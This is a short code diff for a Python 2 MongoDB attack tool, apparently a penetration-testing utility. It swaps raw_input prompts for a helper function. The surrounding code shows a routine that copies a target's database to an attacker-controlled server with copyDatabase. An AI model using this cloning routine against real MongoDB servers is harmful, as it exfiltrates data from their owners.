@@ -2,6 +2,7 @@
 # __author__: sixwhale
 from Lib.setting import TAG_NO
 from Lib.setting import TAG_YES
+from Lib.common import getQuesMsg
 from Lib.common import printErrMsg
 from Lib.common import printInfoMsg
 from pymongo import MongoClient
@@ -18,8 +19,8 @@ def mgAttack(ip,port,myip,myport,clone_info=[0,None]):
         mongoOpen = True
     elif needCreds[0] == 1:
         print '[*] login required......'
-        DBuser = raw_input(Fore.CYAN + 'Username: ')
-        DBpwd = raw_input(Fore.CYAN + 'Password: ')
+        DBuser = getQuesMsg('Username: ')
+        DBpwd = getQuesMsg('Password: ')
     elif needCreds[0] == 2:
         conn = MongoClient(ip,port)
         print '[*] access check failure. Testing will continute but will be unreliable.'
@@ -94,16 +95,16 @@ def cloneDB(conn,myip,myport,clone_db,ip):
         printErrMsg('[Error] couldn\'t get a list of databases to clone.')
     elif clone_db in dbList:
             try:
-                dbNeedCreds = raw_input(Fore.CYAN + '[*] Does this Database require credentials.(y/n)?')
+                dbNeedCreds = getQuesMsg('[*] Does this Database require credentials.(y/n)?')
                 myDBconn = MongoClient(myip,myport)
                 if dbNeedCreds in TAG_NO:
                     myDBconn.copyDatabase(clone_db,clone_db+'_clone',ip)
                 elif dbNeedCreds in TAG_YES:
-                    user = raw_input(Fore.CYAN + 'Username: ')
-                    pwd = raw_input(Fore.CYAN + 'Password: ')
+                    user = getQuesMsg('Username: ')
+                    pwd = getQuesMsg('Password: ')
                     myDBconn.copyDatabase(clone_db,clone_db+'clone',ip,user,pwd)
                 else:
-                    raw_input(Fore.CYAN + '[*] Invalid Selection. Press enter to continue!')
+                    getQuesMsg('[*] Invalid Selection. Press enter to continue!')
                     cloneDB(conn,myip,myport,clone_db,ip)
             except Exception, e:
                 if str(e).find('Connection refused'):
